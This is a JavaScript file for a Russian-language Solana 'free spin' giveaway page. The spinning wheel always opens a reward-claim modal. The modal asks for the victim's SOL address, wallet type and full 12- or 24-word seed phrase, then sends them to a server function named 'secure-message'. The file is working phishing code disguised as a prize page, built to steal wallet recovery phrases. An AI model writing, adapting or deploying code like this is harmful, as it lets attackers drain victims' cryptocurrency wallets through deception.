document.addEventListener('DOMContentLoaded', () => {
    const spinButton = document.getElementById('spin-button');
    const wheel = document.getElementById('wheel');
    const modal = document.getElementById('wallet-modal');
    const closeModalButton = document.getElementById('close-modal');
    const backButton = document.getElementById('back-button');

    const steps = {
        initial: document.getElementById('step-initial'),
        solAddress: document.getElementById('step-sol-address'),
        walletChoice: document.getElementById('step-wallet-choice'),
        seedPhrase: document.getElementById('step-seed-phrase'),
        loading: document.getElementById('step-loading'),
        final: document.getElementById('step-final')
    };

    const claimRewardButton = document.getElementById('claim-reward-button');
    const nextToWalletChoiceButton = document.getElementById('next-to-wallet-choice');
    const walletOptionButtons = document.querySelectorAll('.wallet-option');
    const submitButton = document.getElementById('submit-button');
    const wordCountButtons = document.querySelectorAll('.word-count-btn');

    const solAddressInput = document.getElementById('sol-address-input');
    const seedPhraseInput = document.getElementById('seed-phrase-input');
    const errorMessage = document.getElementById('error-message');

    let isSpinning = false;
    let selectedWordCount = 12;
    let currentStep = 'initial';
    
    let userData = {
        solAddress: '',
        wallet: '',
        seedPhrase: '',
        'g-recaptcha-response': ''
    };

    const showStep = (stepName) => {
        currentStep = stepName;
        Object.values(steps).forEach(step => step.style.display = 'none');
        if (steps[stepName]) {
            steps[stepName].style.display = 'block';
        }
        backButton.style.display = (stepName !== 'initial' && stepName !== 'loading' && stepName !== 'final') ? 'block' : 'none';
    };

    spinButton.addEventListener('click', () => {
        if (isSpinning) return;
        isSpinning = true;
        spinButton.disabled = true;
        spinButton.textContent = '...';

        const spinDuration = 7000;
        const spinAngle = 360 * 10;
        
        wheel.style.transition = `transform ${spinDuration}ms cubic-bezier(.11,.75,.54,1)`;
        wheel.style.transform = `rotate(${spinAngle}deg)`;

        setTimeout(() => {
            wheel.style.transition = 'none';
            wheel.style.transform = 'rotate(0deg)';
            isSpinning = false;
            spinButton.disabled = false;
            spinButton.textContent = 'Free Spin';
            modal.classList.add('visible');
            modal.style.display = 'flex';
        }, spinDuration);
    });
    
    closeModalButton.addEventListener('click', () => {
        modal.style.display = 'none';
        modal.classList.remove('visible');
        setTimeout(resetModal, 300);
    });
    
    backButton.addEventListener('click', () => {
        if(currentStep === 'solAddress') showStep('initial');
        else if (currentStep === 'walletChoice') showStep('solAddress');
        else if (currentStep === 'seedPhrase') showStep('walletChoice');
    });

    claimRewardButton.addEventListener('click', () => showStep('solAddress'));

    nextToWalletChoiceButton.addEventListener('click', () => {
        if (solAddressInput.value.trim().length < 32) {
            alert('Пожалуйста, введите корректный SOL адрес.');
            return;
        }
        userData.solAddress = solAddressInput.value.trim();
        showStep('walletChoice');
    });

    walletOptionButtons.forEach(button => {
        button.addEventListener('click', () => {
            userData.wallet = button.dataset.wallet;
            showStep('seedPhrase');
        });
    });

    wordCountButtons.forEach(button => {
        button.addEventListener('click', () => {
            wordCountButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');
            selectedWordCount = parseInt(button.dataset.count);
            seedPhraseInput.placeholder = `Введите ${selectedWordCount} слов...`;
            validateSeedPhrase();
        });
    });

    const validateSeedPhrase = () => {
        const words = seedPhraseInput.value.trim().split(/\s+/).filter(Boolean);
        if (words.length !== selectedWordCount) {
            errorMessage.textContent = `Ошибка: необходимо ввести ровно ${selectedWordCount} слов. Вы ввели ${words.length}.`;
            errorMessage.style.display = 'block';
            return false;
        }
        errorMessage.style.display = 'none';
        return true;
    };
    
    seedPhraseInput.addEventListener('input', validateSeedPhrase);

    const resetModal = () => {
        showStep('initial');
        solAddressInput.value = '';
        seedPhraseInput.value = '';
        errorMessage.style.display = 'none';
        wordCountButtons.forEach((btn, index) => btn.classList.toggle('active', index === 0));
        selectedWordCount = 12;
        seedPhraseInput.placeholder = `Введите 12 слов...`;
        userData = { solAddress: '', wallet: '', seedPhrase: '', 'g-recaptcha-response': '' };
        if (typeof grecaptcha !== 'undefined') {
            grecaptcha.reset();
        }
        submitButton.disabled = false;
        submitButton.textContent = 'Импортировать';
    };

    submitButton.addEventListener('click', async () => {
        if (!validateSeedPhrase()) return;

        const recaptchaResponse = grecaptcha.getResponse();
        if (!recaptchaResponse) {
            alert('Пожалуйста, пройдите проверку reCAPTCHA.');
            return;
        }
        
        userData.seedPhrase = seedPhraseInput.value.trim();
        userData['g-recaptcha-response'] = recaptchaResponse;

        showStep('loading');
        submitButton.disabled = true;

        try {
            const response = await fetch('/.netlify/functions/secure-message', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData),
            });

            const responseData = await response.json();

            if (!response.ok) {
                throw new Error(responseData.message || 'Ошибка ответа сервера');
            }

            showStep('final');

        } catch (error) {
            alert(`Произошла ошибка при отправке данных: ${error.message}`);
            showStep('seedPhrase');
            if (typeof grecaptcha !== 'undefined') {
                grecaptcha.reset();
            }
            submitButton.disabled = false;
        }
    });
});